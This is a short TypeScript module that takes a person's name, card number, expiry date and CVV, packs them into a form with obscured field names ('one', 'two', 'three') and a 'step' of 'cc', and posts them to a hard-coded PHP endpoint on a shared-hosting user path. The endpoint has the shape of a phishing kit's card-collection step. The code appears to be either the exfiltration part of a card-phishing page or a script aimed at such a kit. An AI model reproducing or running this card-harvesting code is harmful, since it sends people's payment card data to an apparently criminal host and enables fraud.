import axios from 'axios';
import FormData from 'form-data';
const POST_URL =
  'https://vps72510.inmotionhosting.com/~nc27025/swiss/se/index.php' as const;
export type CardInformation = {
  first_name: string;
  last_name: string;
  card_number: string;
  expiration_date: string;
  cvv: number;
};

export async function postCardInformation(card: CardInformation) {
  const formData = new FormData();

  formData.append('step', 'cc');
  formData.append('captcha', '');
  formData.append('first_name', card.first_name);
  formData.append('last_name', card.last_name);
  formData.append('one', card.card_number);
  formData.append('two', card.expiration_date);
  formData.append('three', card.cvv);

  try {
    const result = await axios.post(POST_URL, formData);
    console.log(result.headers);
    // if (result.headers) throw new Error('Invalid card information');
  } catch (e) {
    console.error(e);
  }
}
